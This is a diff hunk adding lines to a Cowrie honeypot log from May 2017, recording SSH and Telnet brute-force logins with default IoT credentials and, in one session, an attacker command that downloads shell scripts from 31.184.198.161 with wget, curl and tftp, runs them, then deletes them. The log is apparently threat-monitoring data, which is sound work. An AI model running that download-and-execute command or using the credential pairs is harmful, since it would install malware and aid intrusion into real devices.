@@ -4077,3 +4077,86 @@
 2017-05-06T03:27:59+0000 [CowrieTelnetTransport,44963,212.47.229.194] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
 	]
 2017-05-06T03:27:59+0000 [CowrieTelnetTransport,44963,212.47.229.194] Connection lost after 154 seconds
+2017-05-06T03:28:10+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 31.184.198.164:49896 (10.8.41.81:2222) [session: 218f2760]
+2017-05-06T03:28:10+0000 [HoneyPotSSHTransport,65648,31.184.198.164] Remote SSH version: SSH-2.0-libssh2_1.4.2
+2017-05-06T03:28:10+0000 [HoneyPotSSHTransport,65648,31.184.198.164] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-05-06T03:28:10+0000 [HoneyPotSSHTransport,65648,31.184.198.164] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-06T03:28:10+0000 [HoneyPotSSHTransport,65648,31.184.198.164] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-06T03:28:11+0000 [HoneyPotSSHTransport,65648,31.184.198.164] NEW KEYS
+2017-05-06T03:28:11+0000 [HoneyPotSSHTransport,65648,31.184.198.164] starting service 'ssh-userauth'
+2017-05-06T03:28:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,65648,31.184.198.164] '1111' trying auth 'password'
+2017-05-06T03:28:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,65648,31.184.198.164] login attempt: 11
+2017-05-06T03:28:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,65648,31.184.198.164] login return, expect: [1111/1111]
+2017-05-06T03:28:11+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,65648,31.184.198.164] login attempt [1111/1111] succeeded
+2017-05-06T03:28:13+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,65648,31.184.198.164] '1111' authenticated with 'password'
+2017-05-06T03:28:13+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,65648,31.184.198.164] starting service 'ssh-connection'
+2017-05-06T03:28:13+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,65648,31.184.198.164] got channel 'session' request
+2017-05-06T03:28:13+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,65648,31.184.198.164] channel open
+2017-05-06T03:28:13+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,65648,31.184.198.164] executing command "yum install wget -y; apt-get install wget -y; cd /tmp ;wget http://31.184.198.161/oh.sh;curl -O http://31.184.198.161/oh.sh;sh oh.sh;rm -rf oh.sh;tftp -r toh.sh -g 31.184.198.161;sh toh.sh; tftp 31.184.198.161 -c get toh2.sh; sh toh2.sh; rm -rf toh.sh toh2.sh oh.sh"
+2017-05-06T03:28:13+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,65648,31.184.198.164] Opening TTY Log: log/tty/20170506-032813-218f2760-0e.log
+2017-05-06T03:28:13+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,65648,31.184.198.164] CMD: yum install wget -y; apt-get install wget -y; cd /tmp ;wget http://31.184.198.161/oh.sh;curl -O http://31.184.198.161/oh.sh;sh oh.sh;rm -rf oh.sh;tftp -r toh.sh -g 31.184.198.161;sh toh.sh; tftp 31.184.198.161 -c get toh2.sh; sh toh2.sh; rm -rf toh.sh toh2.sh oh.sh
+2017-05-06T03:28:13+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,65648,31.184.198.164] Command not found: yum install wget -y
+2017-05-06T03:28:13+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,65648,31.184.198.164] Command found: apt-get install wget -y
+2017-05-06T03:28:16+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 120.92.162.8:28920 (10.8.41.81:2223) [session: TT44976]
+2017-05-06T03:28:23+0000 [CowrieTelnetTransport,44976,120.92.162.8] login attempt: 205
+2017-05-06T03:28:23+0000 [CowrieTelnetTransport,44976,120.92.162.8] login return, expect: [root/xc3511]
+2017-05-06T03:28:23+0000 [CowrieTelnetTransport,44976,120.92.162.8] login attempt [support/support] failed
+2017-05-06T03:28:23+0000 [CowrieTelnetTransport,44976,120.92.162.8] Warning: state changed and new state returned
+2017-05-06T03:28:23+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,65648,31.184.198.164] received eof, sending ctrl-d to command
+2017-05-06T03:28:23+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,65648,31.184.198.164] remote close
+2017-05-06T03:28:23+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,65648,31.184.198.164] Closing TTY Log: log/tty/20170506-032813-218f2760-0e.log after 10 seconds
+2017-05-06T03:28:23+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,65648,31.184.198.164] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-05-06T03:28:23+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,65648,31.184.198.164] sending close 0
+2017-05-06T03:28:23+0000 [HoneyPotSSHTransport,65648,31.184.198.164] avatar 1111 logging out
+2017-05-06T03:28:23+0000 [HoneyPotSSHTransport,65648,31.184.198.164] connection lost
+2017-05-06T03:28:23+0000 [HoneyPotSSHTransport,65648,31.184.198.164] Connection lost after 13 seconds
+2017-05-06T03:28:24+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 130.206.99.99:44707 (10.8.41.81:2222) [session: 2981f6a1]
+2017-05-06T03:28:27+0000 [CowrieTelnetTransport,44976,120.92.162.8] login attempt: 206
+2017-05-06T03:28:27+0000 [CowrieTelnetTransport,44976,120.92.162.8] login return, expect: [root/xc3511]
+2017-05-06T03:28:27+0000 [CowrieTelnetTransport,44976,120.92.162.8] login attempt [enable/shell] failed
+2017-05-06T03:28:27+0000 [CowrieTelnetTransport,44976,120.92.162.8] Warning: state changed and new state returned
+2017-05-06T03:28:27+0000 [-] Connection was probably lost. Could not write to terminal
+2017-05-06T03:28:28+0000 [twisted.internet.defer#critical] Unhandled error in Deferred:
+2017-05-06T03:28:28+0000 [twisted.internet.defer#critical] 
+	Traceback (most recent call last):
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 459, in callback
+	    self._startRunCallbacks(result)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 567, in _startRunCallbacks
+	    self._runCallbacks()
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 653, in _runCallbacks
+	    current.result = callback(current.result, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 1357, in gotResult
+	    _inlineCallbacks(r, g, deferred)
+	--- <exception caught here> ---
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 1301, in _inlineCallbacks
+	    result = g.send(result)
+	  File "/home/cowrie/cowrie/cowrie/commands/apt.py", line 162, in do_install
+	    command_faked_package_class_factory.getCommand(p)
+	exceptions.AttributeError: 'HoneyPotExecProtocol' object has no attribute 'commands'
+	
+2017-05-06T03:28:28+0000 [CowrieTelnetTransport,44976,120.92.162.8] login attempt: 207
+2017-05-06T03:28:28+0000 [CowrieTelnetTransport,44976,120.92.162.8] login return, expect: [root/xc3511]
+2017-05-06T03:28:28+0000 [CowrieTelnetTransport,44976,120.92.162.8] login attempt [sh//bin/busybox ECCHI] failed
+2017-05-06T03:28:28+0000 [CowrieTelnetTransport,44976,120.92.162.8] Warning: state changed and new state returned
+2017-05-06T03:28:28+0000 [HoneyPotSSHTransport,65649,130.206.99.99] Remote SSH version: SSH-2.0-libssh-0.2
+2017-05-06T03:28:28+0000 [HoneyPotSSHTransport,65649,130.206.99.99] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-rsa'
+2017-05-06T03:28:28+0000 [HoneyPotSSHTransport,65649,130.206.99.99] outgoing: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-06T03:28:28+0000 [HoneyPotSSHTransport,65649,130.206.99.99] incoming: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-06T03:28:28+0000 [HoneyPotSSHTransport,65649,130.206.99.99] NEW KEYS
+2017-05-06T03:28:29+0000 [HoneyPotSSHTransport,65649,130.206.99.99] starting service 'ssh-userauth'
+2017-05-06T03:28:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,65649,130.206.99.99] 'leticia' trying auth 'password'
+2017-05-06T03:28:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,65649,130.206.99.99] login attempt: 2719
+2017-05-06T03:28:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,65649,130.206.99.99] login return, expect: [aa/123456]
+2017-05-06T03:28:29+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,65649,130.206.99.99] login attempt [leticia/aicitel] failed
+2017-05-06T03:28:30+0000 [-] 'leticia' failed auth 'password'
+2017-05-06T03:28:30+0000 [-] unauthorized login: 
+2017-05-06T03:28:31+0000 [HoneyPotSSHTransport,65649,130.206.99.99] Got remote error, code 11
+	reason: Bye Bye
+2017-05-06T03:28:31+0000 [HoneyPotSSHTransport,65649,130.206.99.99] connection lost
+2017-05-06T03:28:31+0000 [HoneyPotSSHTransport,65649,130.206.99.99] Connection lost after 6 seconds
+2017-05-06T03:28:40+0000 [CowrieTelnetTransport,44969,212.47.229.194] Closing TTY Log: log/tty/20170506-032710-None-44969i.log after 89 seconds
+2017-05-06T03:28:40+0000 [CowrieTelnetTransport,44969,212.47.229.194] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-05-06T03:28:40+0000 [CowrieTelnetTransport,44969,212.47.229.194] Connection lost after 96 seconds
+2017-05-06T03:29:00+0000 [CowrieTelnetTransport,44976,120.92.162.8] Connection lost after 43 seconds
